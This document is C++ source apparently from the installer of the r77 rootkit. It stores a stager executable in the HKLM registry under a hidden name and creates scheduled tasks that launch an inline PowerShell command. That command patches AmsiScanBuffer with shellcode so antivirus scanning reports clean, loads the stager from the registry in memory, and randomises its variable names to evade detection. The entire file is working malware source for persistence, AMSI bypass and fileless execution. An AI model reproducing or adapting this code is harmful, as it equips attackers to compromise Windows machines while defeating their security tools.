#include "Install.h"

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	InitializeApi(INITIALIZE_API_SRAND);

	// Get stager executable from resources.
	LPBYTE stager;
	DWORD stagerSize;
	if (!GetResource(IDR_INSTALLSTAGER, "EXE", &stager, &stagerSize)) return 0;

	// Write stager executable to registry.
	// This C# executable is compiled with AnyCPU and can be run by both 32-bit and 64-bit powershell.
	// The target framework is 3.5, but it will run, even if .NET 4.x is installed and .NET 3.5 isn't.
	// Because the powershell command may run using .NET 3.5, there is no access to a specific registry view.
	// Therefore, the executable needs to be written to both the 32-bit and the 64-bit registry view.

	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_32KEY, &key) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;

	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS ||
		RegSetValueExW(key, HIDE_PREFIX L"stager", 0, REG_BINARY, stager, stagerSize) != ERROR_SUCCESS) return 0;

	// This powershell command loads the stager from the registry and executes it in memory using Assembly.Load().EntryPoint.Invoke()
	// The C# binary will proceed with creating a native process using process hollowing.
	// The powershell command is purely inline and doesn't require a ps1 file.

	LPWSTR powershellCommand32 = GetPowershellCommand(FALSE);
	LPWSTR powershellCommand64 = GetPowershellCommand(TRUE);

	// Create 32-bit scheduled task to run the powershell stager.
	DeleteScheduledTask(R77_SERVICE_NAME32);
	if (CreateScheduledTask(R77_SERVICE_NAME32, Is64BitOperatingSystem() ? L"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0" : L"", L"powershell", powershellCommand32))
	{
		RunScheduledTask(R77_SERVICE_NAME32);
	}

	// Create 64-bit scheduled task to run the powershell stager.
	if (Is64BitOperatingSystem())
	{
		DeleteScheduledTask(R77_SERVICE_NAME64);
		if (CreateScheduledTask(R77_SERVICE_NAME64, L"", L"powershell", powershellCommand64))
		{
			RunScheduledTask(R77_SERVICE_NAME64);
		}
	}

	return 0;
}

LPWSTR GetPowershellCommand(BOOL is64Bit)
{
	// Powershell inline command to be invoked using powershell.exe "..."

	PWCHAR command = new WCHAR[4096];
	lstrcpyW(command, L"\"");

	// AMSI bypass:
	// [Reflection.Assembly]::Load triggers AMSI and the byte[] with InstallStager.exe is passed to AV for analysis.
	// AMSI must be disabled for the entire process, because both powershell and .NET itself implement AMSI.

	// AMSI is only supported on Windows 10.
	if (IsWindows10OrGreater())
	{
		// Patch amsi.dll!AmsiScanBuffer prior to [Reflection.Assembly]::Load.
		// Do not use Add-Type, because it will invoke csc.exe and compile a C# DLL to disk.
		lstrcatW
		(
			command,
			// Function to create a Delegate from an IntPtr
			L"function Local:Get-Delegate{"
			L"Param("
			L"[OutputType([Type])]"
			L"[Parameter(Position=0)][Type[]]$ParameterTypes,"
			L"[Parameter(Position=1)][Type]$ReturnType"
			L")"
			L"$TypeBuilder=[AppDomain]::CurrentDomain"
			L".DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run)"
			L".DefineDynamicModule('InMe'+'mory'+'Module',$False)"
			L".DefineType('MyDelegateType','Class,Public,Sealed,AnsiClass,AutoClass',[MulticastDelegate]);"
			L"$TypeBuilder.DefineConstructor('RTSpecialName,HideBySig,Public',[Reflection.CallingConventions]::Standard,$ParameterTypes).SetImplementationFlags('Runtime,Managed');"
			L"$TypeBuilder.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$ReturnType,$ParameterTypes).SetImplementationFlags('Runtime,Managed');"
			L"Write-Output $TypeBuilder.CreateType();"
			L"}"

			// Use Microsoft.Win32.UnsafeNativeMethods for some DllImport's.
			L"$NativeMethods=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')})"
			L".GetType('Microsoft.Win32.'+'Uns'+'afeNat'+'iveMetho'+'ds');"
			L"$GetProcAddress=$NativeMethods.GetMethod('Ge'+'tPr'+'ocAdd'+'ress',[Reflection.BindingFlags]'Public,Static',$Null,[Reflection.CallingConventions]::Any,@((New-Object IntPtr).GetType(),[string]),$Null);"

			// Create delegate types
			L"$LoadLibraryDelegate=Get-Delegate @([String])([IntPtr]);"
			L"$VirtualProtectDelegate=Get-Delegate @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType())([Bool]);"

			// Get DLL and function pointers
			L"$Kernel32Ptr=$NativeMethods.GetMethod('Get'+'Modu'+'leHan'+'dle').Invoke($Null,@([Object]('kern'+'el'+'32.dll')));"
			L"$LoadLibraryPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object]('Load'+'LibraryA')));"
			L"$VirtualProtectPtr=$GetProcAddress.Invoke($Null,@([Object]$Kernel32Ptr,[Object]('Vir'+'tual'+'Pro'+'tect')));"
			L"$AmsiPtr=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryPtr,$LoadLibraryDelegate).Invoke('a'+'m'+'si.dll');"

			// Get address of AmsiScanBuffer
			L"$AmsiScanBufferPtr=$GetProcAddress.Invoke($Null,@([Object]$AmsiPtr,[Object]('Ams'+'iSc'+'an'+'Buffer')));"

			// VirtualProtect PAGE_READWRITE
			L"$OldProtect=0;"
			L"[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDelegate).Invoke($AmsiScanBufferPtr,[uint32]8,4,[ref]$OldProtect);"
		);

		// Overwrite AmsiScanBuffer function with shellcode to return AMSI_RESULT_CLEAN.
		if (is64Bit)
		{
			// b8 57 00 07 80	mov		eax, 0x80070057
			// c3				ret
			lstrcatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc3),0,$AmsiScanBufferPtr,6);");
		}
		else
		{
			// b8 57 00 07 80	mov		eax, 0x80070057
			// c2 18 00			ret		0x18
			lstrcatW(command, L"[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x57,0,7,0x80,0xc2,0x18,0),0,$AmsiScanBufferPtr,8);");
		}

		// VirtualProtect PAGE_EXECUTE_READ
		lstrcatW(command, L"[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectPtr,$VirtualProtectDelegate).Invoke($AmsiScanBufferPtr,[uint32]8,0x20,[ref]$OldProtect);");
	}

	// Load InstallStager.exe from registry and invoke
	lstrcatW
	(
		command,
		L"[Reflection.Assembly]::Load"
		L"("
		L"[Microsoft.Win32.Registry]::LocalMachine"
		L".OpenSubkey('SOFTWARE')"
		L".GetValue('" HIDE_PREFIX L"stager')"
		L")"
		L".EntryPoint"
		L".Invoke($Null,$Null)"
	);

	lstrcatW(command, L"\"");

	// Obfuscate all variable names with random strings.
	ObfuscateString(command, L"Get-Delegate");
	ObfuscateString(command, L"ParameterTypes");
	ObfuscateString(command, L"ReturnType");
	ObfuscateString(command, L"TypeBuilder");
	ObfuscateString(command, L"NativeMethods");
	ObfuscateString(command, L"GetProcAddress");
	ObfuscateString(command, L"LoadLibraryDelegate");
	ObfuscateString(command, L"VirtualProtectDelegate");
	ObfuscateString(command, L"Kernel32Ptr");
	ObfuscateString(command, L"LoadLibraryPtr");
	ObfuscateString(command, L"VirtualProtectPtr");
	ObfuscateString(command, L"AmsiPtr");
	ObfuscateString(command, L"AmsiScanBufferPtr");
	ObfuscateString(command, L"OldProtect");

	return command;
}
VOID ObfuscateString(LPWSTR str, LPCWSTR name)
{
	DWORD length = lstrlenW(name);

	LPWSTR newName = new WCHAR[length];
	for (DWORD i = 0; i < length; i++)
	{
		newName[i] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"[rand() * 52 / RAND_MAX];
	}

	for (LPWSTR ocurrence; ocurrence = StrStrIW(str, name);)
	{
		wmemcpy(ocurrence, newName, length);
	}

	delete[] newName;
}